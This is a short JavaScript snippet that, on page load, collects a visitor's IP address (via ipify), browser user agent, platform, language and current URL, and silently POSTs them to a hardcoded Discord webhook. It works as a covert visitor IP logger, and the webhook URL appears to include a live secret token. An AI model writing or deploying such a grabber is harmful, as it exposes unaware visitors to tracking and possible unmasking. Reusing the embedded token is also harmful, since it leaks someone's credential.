// Function to get device information
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
    };
}

// Function to get the IP address using a third-party service
async function getIPAddress() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

// Function to send a webhook with the current URL and device info
async function sendWebhook(url) {
    const ipAddress = await getIPAddress();
    const deviceInfo = getDeviceInfo();
    const message = {
        website: window.location.href, // Get the current page URL
        os: deviceInfo.platform, // Operating system
        ip: ipAddress, // IP address
        deviceInfo: deviceInfo, // Additional device info
    };

    // Log the message to the console
    console.log('Sending message:', message);

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        if (!response.ok) {
            throw new Error(`Error: ${response.statusText}`);
        }

        const data = await response.json();
        console.log('Webhook sent successfully:', data);
    } catch (error) {
        console.error('Error sending webhook:', error);
    }
}

// Example usage
const webhookUrl = 'https://discord.com/api/webhooks/1349363152193851414/TT13asi5W6MCTy5JDR6YCrO7fDz7MGtKOAYLtDnfygnQ2O6Z9n9gYTOfIJDS7M6gIkA0'; // Replace with your webhook URL
sendWebhook(webhookUrl);
